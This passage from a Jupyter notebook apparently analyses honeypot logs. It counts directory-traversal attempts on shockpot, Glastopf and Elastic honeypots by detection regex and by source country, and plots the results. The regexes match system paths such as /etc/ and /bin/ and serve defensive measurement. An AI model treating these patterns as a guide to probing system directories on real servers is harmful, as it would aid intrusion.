       "      <td>\\/tmp\\/</td>\n",
       "      <td>request_raw</td>\n",
       "      <td>13</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\.\\.</td>\n",
       "      <td>request_raw</td>\n",
       "      <td>5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>Elastic</td>\n",
       "      <td>\\.\\/</td>\n",
       "      <td>URL</td>\n",
       "      <td>12</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>Elastic</td>\n",
       "      <td>\\/tmp\\/</td>\n",
       "      <td>URL</td>\n",
       "      <td>28</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "    honeypot    regex      orig_col  attacks\n",
       "0   shockpot  \\/etc\\/          path        1\n",
       "1   shockpot     \\.\\/           URL        1\n",
       "2   shockpot  \\/bin\\/  Content-Type        6\n",
       "3   shockpot  \\/tmp\\/          path       16\n",
       "4   shockpot     \\.\\.           URL        1\n",
       "5   Glastopf  \\/var\\/   request_raw       22\n",
       "6   Glastopf  \\/etc\\/   request_raw        1\n",
       "7   Glastopf     \\.\\/   request_raw        9\n",
       "8   Glastopf  \\/bin\\/   request_raw        4\n",
       "9   Glastopf  \\/tmp\\/   request_raw       13\n",
       "10  Glastopf     \\.\\.   request_raw        5\n",
       "11   Elastic     \\.\\/           URL       12\n",
       "12   Elastic  \\/tmp\\/           URL       28"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_tracker"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "g1=df_tracker.groupby(['honeypot','regex'])['attacks'].sum().reset_index()\n",
    "g1['regex_combined'] = g1.honeypot +\" \"+ g1.regex+\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>honeypot</th>\n",
       "      <th>regex</th>\n",
       "      <th>attacks</th>\n",
       "      <th>regex_combined</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Elastic</td>\n",
       "      <td>\\.\\/</td>\n",
       "      <td>12</td>\n",
       "      <td>Elastic \\.\\/</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Elastic</td>\n",
       "      <td>\\/tmp\\/</td>\n",
       "      <td>28</td>\n",
       "      <td>Elastic \\/tmp\\/</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\.\\.</td>\n",
       "      <td>5</td>\n",
       "      <td>Glastopf \\.\\.</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\.\\/</td>\n",
       "      <td>9</td>\n",
       "      <td>Glastopf \\.\\/</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\/bin\\/</td>\n",
       "      <td>4</td>\n",
       "      <td>Glastopf \\/bin\\/</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\/etc\\/</td>\n",
       "      <td>1</td>\n",
       "      <td>Glastopf \\/etc\\/</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\/tmp\\/</td>\n",
       "      <td>13</td>\n",
       "      <td>Glastopf \\/tmp\\/</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\/var\\/</td>\n",
       "      <td>22</td>\n",
       "      <td>Glastopf \\/var\\/</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>\\.\\.</td>\n",
       "      <td>1</td>\n",
       "      <td>shockpot \\.\\.</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>\\.\\/</td>\n",
       "      <td>1</td>\n",
       "      <td>shockpot \\.\\/</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>\\/bin\\/</td>\n",
       "      <td>6</td>\n",
       "      <td>shockpot \\/bin\\/</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>\\/etc\\/</td>\n",
       "      <td>1</td>\n",
       "      <td>shockpot \\/etc\\/</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>\\/tmp\\/</td>\n",
       "      <td>16</td>\n",
       "      <td>shockpot \\/tmp\\/</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "    honeypot    regex  attacks    regex_combined\n",
       "0    Elastic     \\.\\/       12      Elastic \\.\\/\n",
       "1    Elastic  \\/tmp\\/       28   Elastic \\/tmp\\/\n",
       "2   Glastopf     \\.\\.        5     Glastopf \\.\\.\n",
       "3   Glastopf     \\.\\/        9     Glastopf \\.\\/\n",
       "4   Glastopf  \\/bin\\/        4  Glastopf \\/bin\\/\n",
       "5   Glastopf  \\/etc\\/        1  Glastopf \\/etc\\/\n",
       "6   Glastopf  \\/tmp\\/       13  Glastopf \\/tmp\\/\n",
       "7   Glastopf  \\/var\\/       22  Glastopf \\/var\\/\n",
       "8   shockpot     \\.\\.        1     shockpot \\.\\.\n",
       "9   shockpot     \\.\\/        1     shockpot \\.\\/\n",
       "10  shockpot  \\/bin\\/        6  shockpot \\/bin\\/\n",
       "11  shockpot  \\/etc\\/        1  shockpot \\/etc\\/\n",
       "12  shockpot  \\/tmp\\/       16  shockpot \\/tmp\\/"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "g1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>honeypot</th>\n",
       "      <th>regex</th>\n",
       "      <th>orig_col</th>\n",
       "      <th>attacks</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>\\/etc\\/</td>\n",
       "      <td>path</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>\\.\\/</td>\n",
       "      <td>URL</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>\\/bin\\/</td>\n",
       "      <td>Content-Type</td>\n",
       "      <td>6</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>\\/tmp\\/</td>\n",
       "      <td>path</td>\n",
       "      <td>16</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>\\.\\.</td>\n",
       "      <td>URL</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\/var\\/</td>\n",
       "      <td>request_raw</td>\n",
       "      <td>22</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\/etc\\/</td>\n",
       "      <td>request_raw</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\.\\/</td>\n",
       "      <td>request_raw</td>\n",
       "      <td>9</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\/bin\\/</td>\n",
       "      <td>request_raw</td>\n",
       "      <td>4</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\/tmp\\/</td>\n",
       "      <td>request_raw</td>\n",
       "      <td>13</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\.\\.</td>\n",
       "      <td>request_raw</td>\n",
       "      <td>5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>Elastic</td>\n",
       "      <td>\\.\\/</td>\n",
       "      <td>URL</td>\n",
       "      <td>12</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>Elastic</td>\n",
       "      <td>\\/tmp\\/</td>\n",
       "      <td>URL</td>\n",
       "      <td>28</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "    honeypot    regex      orig_col  attacks\n",
       "0   shockpot  \\/etc\\/          path        1\n",
       "1   shockpot     \\.\\/           URL        1\n",
       "2   shockpot  \\/bin\\/  Content-Type        6\n",
       "3   shockpot  \\/tmp\\/          path       16\n",
       "4   shockpot     \\.\\.           URL        1\n",
       "5   Glastopf  \\/var\\/   request_raw       22\n",
       "6   Glastopf  \\/etc\\/   request_raw        1\n",
       "7   Glastopf     \\.\\/   request_raw        9\n",
       "8   Glastopf  \\/bin\\/   request_raw        4\n",
       "9   Glastopf  \\/tmp\\/   request_raw       13\n",
       "10  Glastopf     \\.\\.   request_raw        5\n",
       "11   Elastic     \\.\\/           URL       12\n",
       "12   Elastic  \\/tmp\\/           URL       28"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_cowrie_tracker = pd.DataFrame(tracker,columns=['honeypot','regex','orig_col','attacks'])\n",
    "df_cowrie_tracker"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "g1_c_X = g1[g1.honeypot == \"Cowrie\"].regex\n",
    "g1_c_y = g1[g1.honeypot == \"Cowrie\"].attacks\n",
    "g1_e_X = g1[g1.honeypot == \"Elastic\"].regex\n",
    "g1_e_y = g1[g1.honeypot == \"Elastic\"].attacks\n",
    "g1_g_X = g1[g1.honeypot == \"Glastopf\"].regex\n",
    "g1_g_y = g1[g1.honeypot == \"Glastopf\"].attacks\n",
    "g1_s_X = g1[g1.honeypot == \"shockpot\"].regex\n",
    "g1_s_y = g1[g1.honeypot == \"shockpot\"].attacks"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import matplotlib.pyplot as plt\n",
    "\n",
    "plt.barh(g1_e_X, g1_e_y)\n",
    "plt.title(\"Elastic attacks\")\n",
    "plt.xlabel(\"Number of Attacks\")\n",
    "plt.ylabel(\"Regular Expression used\")\n",
    "plt.gcf().set_size_inches(6, 4)\n",
    "plt.xticks(rotation=90)\n",
    "plt.grid(True,alpha=.25)\n",
    "plt.tight_layout()\n",
    "for i, v in enumerate(g1_e_y):\n",
    "    plt.text(v +.1, i-.1 , str(v), color='blue',)\n",
    "plt.savefig(\"OE3.Elastic_attack.png\")\n",
    "plt.show()\n",
    "\n",
    "plt.barh(g1_g_X, g1_g_y)\n",
    "plt.title(\"Glastopf attacks\")\n",
    "plt.xlabel(\"Number of Attacks\")\n",
    "plt.ylabel(\"Regular Expression used\")\n",
    "plt.gcf().set_size_inches(6, 4)\n",
    "plt.xticks(rotation=90)\n",
    "plt.grid(True,alpha=.25)\n",
    "plt.tight_layout()\n",
    "for i, v in enumerate(g1_g_y):\n",
    "    plt.text(v +.1, i-.1 , str(v), color='blue',)\n",
    "plt.savefig(\"OE3.Glastopf_attack.png\")\n",
    "plt.show()\n",
    "\n",
    "plt.barh(g1_s_X, g1_s_y)\n",
    "plt.title(\"Shockpot attacks\")\n",
    "plt.xlabel(\"Number of Attacks\")\n",
    "plt.ylabel(\"Regular Expression used\")\n",
    "plt.gcf().set_size_inches(6, 4)\n",
    "plt.xticks(rotation=90)\n",
    "plt.grid(True,alpha=.25)\n",
    "plt.tight_layout()\n",
    "for i, v in enumerate(g1_s_y):\n",
    "    plt.text(v+.1, i-.1 , str(v), color='blue',)\n",
    "plt.savefig(\"OE3.Shockpot_attack.png\")\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Brazil           48\n",
       "China            34\n",
       "United States     8\n",
       "Mexico            5\n",
       "Ukraine           4\n",
       "France            3\n",
       "Japan             2\n",
       "Name: country, dtype: int64"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "g2_type = pd.concat([dfs_1.country, dfg_1.country, dfe_1.country]).value_counts()\n",
    "g2_type"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 576x288 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "#g2_type_X = pd.concat([dfs_1.country, dfg_1.country, dfe_1.country, dfc_1.country]).value_counts().index\n",
    "#g2_type_y = pd.concat([dfs_1.country, dfg_1.country, dfe_1.country, dfc_1.country]).value_counts().values\n",
    "#print(pd.concat([dfs_1.country, dfg_1.country, dfe_1.country, dfc_1.country]).value_counts())\n",
    "\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "plt.barh(g2_type.index, g2_type.values)\n",
    "plt.title(\"Directory Traversal by country\")\n",
    "plt.ylabel(\"No. of Attacks\")\n",
    "plt.gcf().set_size_inches(8, 4)\n",
    "plt.xticks(rotation=90)\n",
    "plt.grid(True, alpha=.5)\n",
    "plt.tight_layout()\n",
    "for i, v in enumerate(g2_type.values):\n",
    "    plt.text(v+.5, i , str(v), color='blue',)\n",
    "plt.savefig(\"OE3.Directory_traversal_by_country.png\")\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
